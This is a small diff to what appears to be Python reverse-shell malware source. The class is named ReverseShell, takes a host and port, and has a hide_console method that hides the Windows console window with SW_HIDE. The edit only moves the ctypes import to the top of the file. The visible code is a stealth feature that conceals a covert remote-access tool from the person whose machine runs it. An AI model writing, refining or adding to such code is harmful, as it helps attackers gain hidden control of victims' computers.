@@ -10,6 +10,7 @@ import sys
 import platform
 import getpass
 import time
+import ctypes
 
 class ReverseShell:
     def __init__(self, host, port):
@@ -20,7 +21,7 @@ class ReverseShell:
     def hide_console(self):
         """Ẩn cửa sổ console trên Windows"""
         if platform.system() == 'Windows':
-            import ctypes
+            
             ctypes.windll.user32.ShowWindow(
                 ctypes.windll.kernel32.GetConsoleWindow(), 
                 0  # SW_HIDE
